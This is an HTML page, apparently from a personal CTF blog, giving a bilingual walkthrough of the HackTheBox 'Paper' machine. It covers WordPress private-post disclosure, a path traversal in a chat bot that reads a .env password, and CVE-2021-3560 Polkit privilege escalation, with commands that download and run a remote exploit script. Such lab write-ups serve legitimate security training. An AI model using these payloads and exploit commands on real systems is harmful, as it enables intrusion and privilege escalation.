@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>paper | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">paper</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a WordPress instance version 5.2.3 on the domain <code>office.paper</code>, which was vulnerable to an unauthenticated view of private/draft posts. By exploiting this vulnerability through the <code>?static=1</code> parameter, I discovered a secret registration URL for a Rocket.Chat instance hosted at <code>chat.office.paper</code>.</p>
+                    
+                    <p>After registering on the Rocket.Chat platform, I identified a chatbot named "recyclops" that had vulnerable file access functionality. By exploiting path traversal in the bot's file reading commands, I was able to read the <code>.env</code> file containing credentials for the user <code>dwight</code>, which granted SSH access to the system.</p>
+                    
+                    <p>For privilege escalation, I used <code>linpeas.sh</code> to enumerate the system and discovered it was vulnerable to CVE-2021-3560, a Polkit authentication bypass vulnerability. By exploiting this flaw through D-Bus method calls, I created a privileged user account that allowed me to escalate to root access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> WordPress 5.2.3 unauthenticated private post disclosure, Rocket.Chat bot path traversal, CVE-2021-3560 (Polkit privilege escalation via D-Bus).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports including SSH, HTTP, and HTTPS services" /></p>
+
+                <p>The scan reveals standard services: SSH on port 22, HTTP on port 80, and HTTPS on port 443. Both the HTTP and HTTPS services display a default Apache/CentOS test page.</p>
+
+                <h2>Web Enumeration - Virtual Host Discovery</h2>
+                <p>Running <code>whatweb</code> against the HTTP service provides more detailed information:</p>
+                <pre><code class="language-bash">whatweb http://10.10.11.143</code></pre>
+
+                <p>The output reveals interesting headers:</p>
+                <pre><code class="language-plaintext">http://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], 
+Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], 
+IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], 
+PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], 
+UncommonHeaders[x-backend-server], X-Backend[office.paper]</code></pre>
+
+                <p>The key finding here is the <code>X-Backend</code> header revealing the virtual host <code>office.paper</code>. I add this to my <code>/etc/hosts</code> file:</p>
+                <pre><code class="language-bash">echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>WordPress Discovery and Enumeration</h2>
+                <p>Accessing <code>http://office.paper</code>, I discover a WordPress site. Running <code>whatweb</code> again:</p>
+                <pre><code class="language-bash">whatweb http://office.paper</code></pre>
+
+                <p>This confirms WordPress version 5.2.3 is running:</p>
+                <pre><code class="language-plaintext">http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], 
+Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], 
+IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], 
+PoweredBy[WordPress,WordPress,], Script[text/javascript], 
+Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], 
+UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]</code></pre>
+
+                <p>Using <code>cmseek</code> for WordPress enumeration, I harvest several usernames:</p>
+                <pre><code class="language-plaintext">Usernames harvested: 3
+├── nick
+├── creedthoughts
+└── prisonmike</code></pre>
+
+                <p>Running <code>wpscan</code> doesn't reveal any additional critical vulnerabilities beyond what I've already found.</p>
+
+                <h2>WordPress Vulnerability - Unauthenticated Private Post Disclosure</h2>
+                <p>Researching WordPress 5.2.3 vulnerabilities, I find an interesting exploit at <a href="https://www.exploit-db.com/exploits/47690">https://www.exploit-db.com/exploits/47690</a>. This vulnerability allows viewing private or draft posts by simply appending <code>?static=1</code> to the WordPress URL.</p>
+
+                <p>Accessing <code>http://office.paper/?static=1</code>, I discover a private post containing a conversation with critical information:</p>
+                <blockquote>
+                    <h3>Secret Registration URL of new Employee chat system</h3>
+                    <p><a href="http://chat.office.paper/register/8qozr226AhkCHZdyY">http://chat.office.paper/register/8qozr226AhkCHZdyY</a></p>
+                </blockquote>
+
+                <p>This reveals another virtual host. I add <code>chat.office.paper</code> to my <code>/etc/hosts</code> file:</p>
+                <pre><code class="language-bash">echo "10.10.11.143 chat.office.paper" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>Rocket.Chat Registration and Reconnaissance</h2>
+                <p>Accessing the registration URL, I find a Rocket.Chat instance - a team collaboration platform similar to Discord or Slack. After registering an account and entering the general chat channel, I observe conversations mentioning a bot named "recyclops".</p>
+
+                <p>The bot's description indicates it has file access capabilities:</p>
+                <blockquote>
+                    <p><strong>3. Files:</strong><br>
+                    e.g., 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'</p>
+                    <p><strong>4. List:</strong><br>
+                    You can ask me to list files</p>
+                </blockquote>
+
+                <p>While I cannot interact with recyclops in the general chat, I'm able to open a direct message conversation with the bot.</p>
+
+                <h2>Exploiting the Recyclops Bot - Path Traversal</h2>
+                <p>Testing the bot's file access functionality, I immediately identify a path traversal vulnerability:</p>
+                <p><img src="./media/image3.png" alt="Rocket.Chat conversation with recyclops bot showing path traversal exploitation to read files outside the intended directory" /></p>
+
+                <p>The bot doesn't properly sanitize file paths, allowing me to use <code>../</code> to traverse directories. I craft a command to read the bot's environment configuration file:</p>
+                <pre><code class="language-plaintext">file ../hubot/.env</code></pre>
+
+                <p>The bot responds with the contents of the <code>.env</code> file, which contains credentials:</p>
+                <pre><code class="language-bash">export ROCKETCHAT_PASSWORD=Queenofblad3s!23</code></pre>
+
+                <p>Knowing that the bot was created by the user <code>dwight</code> (visible in the chat interface), I attempt SSH access with these credentials:</p>
+                <pre><code class="language-bash">ssh dwight@10.10.11.143</code></pre>
+
+                <p>The credentials work! I successfully gain access to the machine as <code>dwight</code> and retrieve the user flag.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining initial access, I enumerate the system to find privilege escalation vectors. Running <code>ss -tuln</code> to check for internal listening ports:</p>
+                <p><img src="./media/image1.png" alt="Output of ss -tuln showing internal listening ports including MongoDB and MySQL services" /></p>
+
+                <p>The output reveals several internal services including MongoDB and MySQL. After investigating these services and not finding immediate exploitation paths, I decide to use automated enumeration tools.</p>
+
+                <h2>LinPEAS Enumeration</h2>
+                <p>I download and execute <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">linpeas.sh</a>, a comprehensive privilege escalation enumeration script:</p>
+                <pre><code class="language-bash">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+
+                <p>After reviewing the extensive output, the most promising finding is:</p>
+                <pre><code class="language-plaintext">Vulnerable to CVE-2021-3560</code></pre>
+
+                <p>This is a critical privilege escalation vulnerability in Polkit. More information about this CVE can be found at <a href="https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2021-3560">https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2021-3560</a>.</p>
+
+                <h2>Privilege Escalation - CVE-2021-3560 (Polkit)</h2>
+                <p>Researching the vulnerability, I find a proof-of-concept exploit: <a href="https://github.com/tufanturhan/Polkit-Linux-Priv">https://github.com/tufanturhan/Polkit-Linux-Priv</a></p>
+
+                <h3>Understanding CVE-2021-3560</h3>
+                <p>According to the exploit documentation:</p>
+                <blockquote>
+                    <p>"CVE-2021-3560 is an authentication bypass on polkit, which allows unprivileged users to call privileged methods using DBus. In this exploit we will call 2 privileged methods provided by accountsservice (CreateUser and SetPassword), which allows us to create a privileged user then set a password to it and at the end log in as the created user and then elevate to root."</p>
+                </blockquote>
+
+                <p>The vulnerability works by exploiting a race condition in Polkit. When a D-Bus request is made and then immediately killed before Polkit can verify the requester's authorization, Polkit incorrectly treats the requestor as the root user.</p>
+
+                <h3>Exploit Mechanism</h3>
+                <p>Reviewing the exploit code, I can see it performs the following actions:</p>
+                <ol>
+                    <li>Uses <code>dbus-send --system</code> to call <code>org.freedesktop.Accounts.CreateUser</code></li>
+                    <li>Kills the D-Bus request at a precise moment to trigger the race condition</li>
+                    <li>Checks if the user was successfully created</li>
+                    <li>Creates the user as a privileged account by passing the <code>int32:1</code> flag</li>
+                    <li>Sets a password for the newly created user</li>
+                </ol>
+
+                <p>The critical part is the <code>int32:1</code> flag - this creates the user as an administrator with full sudo privileges.</p>
+
+                <h3>Executing the Exploit</h3>
+                <p>I download and execute the exploit on the target system:</p>
+                <pre><code class="language-bash">curl -L https://raw.githubusercontent.com/tufanturhan/Polkit-Linux-Priv/main/CVE-2021-3560.py -o exploit.py
+chmod +x exploit.py
+./exploit.py</code></pre>
+
+                <p>The exploit successfully creates a privileged user. I can then switch to this user and escalate to root:</p>
+                <pre><code class="language-bash">su - [created_user]
+sudo su</code></pre>
+
+                <p>This grants me root access:</p>
+                <pre><code class="language-bash">[root@paper dwight]# whoami
+root</code></pre>
+
+                <p>I can now retrieve the root flag and complete the machine. The privilege escalation demonstrates how a timing vulnerability in a system authentication component can be exploited to completely bypass privilege restrictions.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una instancia de WordPress versión 5.2.3 en el dominio <code>office.paper</code>, vulnerable a la visualización no autenticada de posts privados/borrador. Explotando esta vulnerabilidad mediante el parámetro <code>?static=1</code>, descubrí una URL secreta de registro para una instancia de Rocket.Chat alojada en <code>chat.office.paper</code>.</p>
+                    
+                    <p>Tras registrarme en la plataforma Rocket.Chat, identifiqué un chatbot llamado "recyclops" que tenía funcionalidad vulnerable de acceso a archivos. Explotando path traversal en los comandos de lectura de archivos del bot, pude leer el archivo <code>.env</code> que contenía credenciales del usuario <code>dwight</code>, lo cual me otorgó acceso SSH al sistema.</p>
+                    
+                    <p>Para la escalada de privilegios, utilicé <code>linpeas.sh</code> para enumerar el sistema y descubrí que era vulnerable a CVE-2021-3560, una vulnerabilidad de bypass de autenticación en Polkit. Explotando este fallo mediante llamadas a métodos D-Bus, creé una cuenta de usuario privilegiada que me permitió escalar a acceso root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> WordPress 5.2.3 divulgación de posts privados no autenticada, path traversal en bot de Rocket.Chat, CVE-2021-3560 (escalada de privilegios en Polkit mediante D-Bus).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH, HTTP y servicios HTTPS" /></p>
+
+                <p>El escaneo revela servicios estándar: SSH en el puerto 22, HTTP en el puerto 80, y HTTPS en el puerto 443. Tanto el servicio HTTP como HTTPS muestran una página de test por defecto de Apache/CentOS.</p>
+
+                <h2>Enumeración Web - Descubrimiento de Virtual Host</h2>
+                <p>Ejecutando <code>whatweb</code> contra el servicio HTTP proporciona información más detallada:</p>
+                <pre><code class="language-bash">whatweb http://10.10.11.143</code></pre>
+
+                <p>La salida revela cabeceras interesantes:</p>
+                <pre><code class="language-plaintext">http://10.10.11.143 [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], 
+Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], 
+IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], 
+PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], 
+UncommonHeaders[x-backend-server], X-Backend[office.paper]</code></pre>
+
+                <p>El hallazgo clave aquí es la cabecera <code>X-Backend</code> que revela el virtual host <code>office.paper</code>. Lo añado a mi archivo <code>/etc/hosts</code>:</p>
+                <pre><code class="language-bash">echo "10.10.11.143 office.paper" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>Descubrimiento y Enumeración de WordPress</h2>
+                <p>Accediendo a <code>http://office.paper</code>, descubro un sitio WordPress. Ejecutando <code>whatweb</code> de nuevo:</p>
+                <pre><code class="language-bash">whatweb http://office.paper</code></pre>
+
+                <p>Esto confirma que se está ejecutando WordPress versión 5.2.3:</p>
+                <pre><code class="language-plaintext">http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], 
+Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], 
+IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], 
+PoweredBy[WordPress,WordPress,], Script[text/javascript], 
+Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], 
+UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]</code></pre>
+
+                <p>Usando <code>cmseek</code> para la enumeración de WordPress, recopilo varios nombres de usuario:</p>
+                <pre><code class="language-plaintext">Nombres de usuario recopilados: 3
+├── nick
+├── creedthoughts
+└── prisonmike</code></pre>
+
+                <p>Ejecutar <code>wpscan</code> no revela vulnerabilidades críticas adicionales más allá de lo que ya he encontrado.</p>
+
+                <h2>Vulnerabilidad de WordPress - Divulgación de Posts Privados sin Autenticación</h2>
+                <p>Investigando vulnerabilidades de WordPress 5.2.3, encuentro un exploit interesante en <a href="https://www.exploit-db.com/exploits/47690">https://www.exploit-db.com/exploits/47690</a>. Esta vulnerabilidad permite ver posts privados o en borrador simplemente añadiendo <code>?static=1</code> a la URL de WordPress.</p>
+
+                <p>Accediendo a <code>http://office.paper/?static=1</code>, descubro un post privado que contiene una conversación con información crítica:</p>
+                <blockquote>
+                    <h3>URL de Registro Secreto del nuevo sistema de chat para Empleados</h3>
+                    <p><a href="http://chat.office.paper/register/8qozr226AhkCHZdyY">http://chat.office.paper/register/8qozr226AhkCHZdyY</a></p>
+                </blockquote>
+
+                <p>Esto revela otro virtual host. Añado <code>chat.office.paper</code> a mi archivo <code>/etc/hosts</code>:</p>
+                <pre><code class="language-bash">echo "10.10.11.143 chat.office.paper" | sudo tee -a /etc/hosts</code></pre>
+
+                <h2>Registro en Rocket.Chat y Reconocimiento</h2>
+                <p>Accediendo a la URL de registro, encuentro una instancia de Rocket.Chat - una plataforma de colaboración en equipo similar a Discord o Slack. Tras registrar una cuenta y entrar al canal de chat general, observo conversaciones que mencionan un bot llamado "recyclops".</p>
+
+                <p>La descripción del bot indica que tiene capacidades de acceso a archivos:</p>
+                <blockquote>
+                    <p><strong>3. Archivos:</strong><br>
+                    p.ej., 'recyclops get me the file test.txt', o 'recyclops could you send me the file src/test.php' o simplemente 'recyclops file test.txt'</p>
+                    <p><strong>4. Listar:</strong><br>
+                    Puedes pedirme que liste archivos</p>
+                </blockquote>
+
+                <p>Aunque no puedo interactuar con recyclops en el chat general, puedo abrir una conversación de mensaje directo con el bot.</p>
+
+                <h2>Explotando el Bot Recyclops - Path Traversal</h2>
+                <p>Probando la funcionalidad de acceso a archivos del bot, identifico inmediatamente una vulnerabilidad de path traversal:</p>
+                <p><img src="./media/image3.png" alt="Conversación en Rocket.Chat con el bot recyclops mostrando la explotación de path traversal para leer archivos fuera del directorio previsto" /></p>
+
+                <p>El bot no sanitiza apropiadamente las rutas de archivos, permitiéndome usar <code>../</code> para recorrer directorios. Diseño un comando para leer el archivo de configuración de entorno del bot:</p>
+                <pre><code class="language-plaintext">file ../hubot/.env</code></pre>
+
+                <p>El bot responde con el contenido del archivo <code>.env</code>, que contiene credenciales:</p>
+                <pre><code class="language-bash">export ROCKETCHAT_PASSWORD=Queenofblad3s!23</code></pre>
+
+                <p>Sabiendo que el bot fue creado por el usuario <code>dwight</code> (visible en la interfaz del chat), intento acceso SSH con estas credenciales:</p>
+                <pre><code class="language-bash">ssh dwight@10.10.11.143</code></pre>
+
+                <p>¡Las credenciales funcionan! Obtengo exitosamente acceso a la máquina como <code>dwight</code> y recupero la flag de usuario.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener el acceso inicial, enumero el sistema para encontrar vectores de escalada de privilegios. Ejecutando <code>ss -tuln</code> para verificar puertos internos escuchando:</p>
+                <p><img src="./media/image1.png" alt="Salida de ss -tuln mostrando puertos internos escuchando incluyendo servicios MongoDB y MySQL" /></p>
+
+                <p>La salida revela varios servicios internos incluyendo MongoDB y MySQL. Tras investigar estos servicios sin encontrar rutas de explotación inmediatas, decido usar herramientas de enumeración automatizadas.</p>
+
+                <h2>Enumeración con LinPEAS</h2>
+                <p>Descargo y ejecuto <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">linpeas.sh</a>, un script exhaustivo de enumeración para escalada de privilegios:</p>
+                <pre><code class="language-bash">curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+
+                <p>Tras revisar la extensa salida, el hallazgo más prometedor es:</p>
+                <pre><code class="language-plaintext">Vulnerable to CVE-2021-3560</code></pre>
+
+                <p>Esta es una vulnerabilidad crítica de escalada de privilegios en Polkit. Más información sobre este CVE se puede encontrar en <a href="https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2021-3560">https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2021-3560</a>.</p>
+
+                <h2>Escalada de Privilegios - CVE-2021-3560 (Polkit)</h2>
+                <p>Investigando la vulnerabilidad, encuentro una prueba de concepto del exploit: <a href="https://github.com/tufanturhan/Polkit-Linux-Priv">https://github.com/tufanturhan/Polkit-Linux-Priv</a></p>
+
+                <h3>Entendiendo CVE-2021-3560</h3>
+                <p>Según la documentación del exploit:</p>
+                <blockquote>
+                    <p>"CVE-2021-3560 es un bypass de autenticación en polkit, que permite a usuarios no privilegiados llamar a métodos privilegiados usando DBus. En este exploit llamaremos a 2 métodos privilegiados proporcionados por accountsservice (CreateUser y SetPassword), que nos permiten crear un usuario privilegiado, luego establecer una contraseña para él y finalmente iniciar sesión como el usuario creado y entonces escalar a root."</p>
+                </blockquote>
+
+                <p>La vulnerabilidad funciona explotando una condición de carrera en Polkit. Cuando se hace una petición D-Bus que luego se mata inmediatamente antes de que Polkit pueda verificar la autorización del solicitante, Polkit trata incorrectamente al solicitante como el usuario root.</p>
+
+                <h3>Mecanismo del Exploit</h3>
+                <p>Revisando el código del exploit, puedo ver que realiza las siguientes acciones:</p>
+                <ol>
+                    <li>Usa <code>dbus-send --system</code> para llamar a <code>org.freedesktop.Accounts.CreateUser</code></li>
+                    <li>Mata la petición D-Bus en un momento preciso para desencadenar la condición de carrera</li>
+                    <li>Comprueba si el usuario fue creado exitosamente</li>
+                    <li>Crea el usuario como una cuenta privilegiada pasando el flag <code>int32:1</code></li>
+                    <li>Establece una contraseña para el usuario recién creado</li>
+                </ol>
+
+                <p>La parte crítica es el flag <code>int32:1</code> - esto crea el usuario como administrador con privilegios completos de sudo.</p>
+
+                <h3>Ejecutando el Exploit</h3>
+                <p>Descargo y ejecuto el exploit en el sistema objetivo:</p>
+                <pre><code class="language-bash">curl -L https://raw.githubusercontent.com/tufanturhan/Polkit-Linux-Priv/main/CVE-2021-3560.py -o exploit.py
+chmod +x exploit.py
+./exploit.py</code></pre>
+
+                <p>El exploit crea exitosamente un usuario privilegiado. Luego puedo cambiar a este usuario y escalar a root:</p>
+                <pre><code class="language-bash">su - [usuario_creado]
+sudo su</code></pre>
+
+                <p>Esto me otorga acceso root:</p>
+                <pre><code class="language-bash">[root@paper dwight]# whoami
+root</code></pre>
+
+                <p>Ahora puedo recuperar la flag de root y completar la máquina. La escalada de privilegios demuestra cómo una vulnerabilidad de timing en un componente de autenticación del sistema puede ser explotada para bypass completo de las restricciones de privilegios.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
